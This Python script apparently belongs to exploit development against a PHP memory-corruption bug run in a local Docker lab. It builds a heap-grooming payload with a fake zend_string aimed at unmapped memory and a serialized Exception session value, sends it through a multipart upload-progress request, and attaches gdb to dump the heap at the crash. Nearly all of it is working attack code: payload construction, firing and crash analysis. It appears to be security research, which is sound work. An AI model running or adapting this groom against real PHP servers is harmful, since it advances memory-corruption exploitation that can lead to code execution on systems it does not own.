#!/usr/bin/env python3
"""smb_oracle9_gdb.py — SEGV-at-read probe: map the groom region at writeback time.

Consumer groom = v8 fake_d (hdr@d+0x2D8, len=32, val=UNMAPPED 0xdead0000)
+ session `k|R:3;o|O:9:"Exception":0:{}`.
The writeback serialize of k appends 32 bytes from 0xdead0000 => SIGSEGV
mid-writeback. gdb (attached pre-producer) catches it:
  - dump d..d+0x2000 (groom region state AT writeback time)
  - find the Exception zval copy: search the heap dump for u1u2 qword
    0x0000000100000108 (IS_OBJECT|refcounted type_info + VAR_WAKEUP_FLAG extra)
Offline analysis answers: what clobbered the groom, and where did the
object zval copy land.
"""
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle2 as o2
import smb_oracle8 as o8


def main():
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    maps = s.get_maps("vuln")
    pid = int(s.helper("vuln", "pid")[0].strip())
    base = int([l for l in maps if "/usr/local/bin/php" in l and "r-xp" in l][0]
               .split("-")[0].split()[0], 16)
    print(f"php pid={pid} base={hex(base)}")
    tag = int(time.time())

    # gdb: stop at SIGSEGV, dump the groom region + registers, then search pattern
    gdbscript = f"""
set pagination off
set confirm off
set auto-solib-add off
handle SIGSEGV stop print nopass
continue
echo ===SEGV===\\n
info registers pc x0 x1 x2
echo ===DUMPGROOM===\\n
dump binary memory /tmp/groom_{tag}.bin $d $d+0x2000
echo ===DUMPHEAP===\\n
dump binary memory /tmp/heap_{tag}.bin $d-0x40000 $d+0x40000
echo ===REGS===\\n
info registers
detach
quit
"""
    open(f"/tmp/gdbscript_{tag}.txt", "w").write(gdbscript.replace("$d", "((long)$d)"))
    # pass d via -ex before continue: simpler to two-phase; instead we set d
    # after producer using a fifo... simplest: run gdb with a script file that
    # we patch after finding d, but gdb must attach BEFORE producer for clean
    # state... actually attach can happen after producer too (attempt-2 did).
    print("phase 1: producer + find d")
    sid = f"p9{tag}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print("producer:", st)
    d = o2.find_bg()
    if not d:
        print("no d")
        return 1
    print("d =", hex(d))
    gsid = f"g9{tag}"
    o8.stage(gsid, b'k|R:3;o|O:9:"Exception":0:{}')
    # groom with val = unmapped
    import struct

    def fake_d_fault(gaddr):
        b = bytearray(o8.fake_d8(gaddr))
        # move the fake string hdr to d+0x440 (v7-proven safe), val = 0xdead0000
        # hdr@0x440: refcount@0x440, type@0x444, h@0x448, len@0x450, val@0x458
        struct.pack_into("<I", b, 0x440, 100)
        struct.pack_into("<I", b, 0x444, 6)
        struct.pack_into("<Q", b, 0x448, 0)
        struct.pack_into("<Q", b, 0x450, 32)           # len
        struct.pack_into("<Q", b, 0x458, 0x0000dead0000)  # val = unmapped
        # fake zval @0x400 -> hdr @0x440
        struct.pack_into("<Q", b, 0x400, gaddr + 0x440)
        struct.pack_into("<I", b, 0x408, o8.IS_STRING_EX)
        # neutralize the old hdr at 0x2D8 (len->0) to avoid double-read confusion
        struct.pack_into("<Q", b, 0x2E8, 0)
        return bytes(b)

    g = fake_d_fault(d)
    body = (o8.part(b"PHPSESSID", gsid.encode()) +
            o8.part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            o8.part(b"g", g) +
            o8.file_part_head(b"f") + b"z" * 8192 + b"\r\n" +
            b"--" + o8.BND + b"--\r\n")

    script = f"""
set pagination off
set confirm off
set auto-solib-add off
handle SIGSEGV stop print nopass
continue
echo ===SEGV===\\n
printf "d=%p pc=%p\\n", {d}, $pc
info registers pc x0 x1 x2
echo ===DUMPGROOM===\\n
dump binary memory /out/groom.bin {d} {d + 0x2000}
echo ===DUMPHEAP===\\n
dump binary memory /out/heap.bin {d - 0x40000} {d + 0x40000}
echo ===DONE===\\n
detach
quit
"""
    open("/tmp/gdbscript9.txt", "w").write(script)
    cmd = ["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
           "--pid=container:" + q.CT["vuln"], "-v", "/tmp/gdbscript9.txt:/gs.txt:ro",
           "-v", "/tmp/smb9out:/out", "smb-gdb-helper",
           "sh", "-c",
           f"gdb -batch -p {pid} -x /gs.txt > /out/gdb.log 2>&1 || true"]
    proc = subprocess.Popen(cmd)
    time.sleep(10)  # attach + continue
    print("phase 2: firing consumer")
    status = o8.send_post(body)
    print("consumer:", status)
    try:
        proc.wait(timeout=60)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
    subprocess.run(["docker", "cp", f"stealmybitcoin-smb-php-vuln-1:/tmp/groom.bin",
                    "/tmp/smb9_groom.bin"], capture_output=True)
    subprocess.run(["docker", "cp", f"stealmybitcoin-smb-php-vuln-1:/tmp/heap.bin",
                    "/tmp/smb9_heap.bin"], capture_output=True)
    rc, out = q.docker_exec(q.CT["vuln"], "cat /tmp/sess_" + gsid + " 2>/dev/null | head -c 100")
    print("sess:", out[:80])
    print("dumped: /tmp/smb9_groom.bin /tmp/smb9_heap.bin")
    return 0


if __name__ == "__main__":
    sys.exit(main())
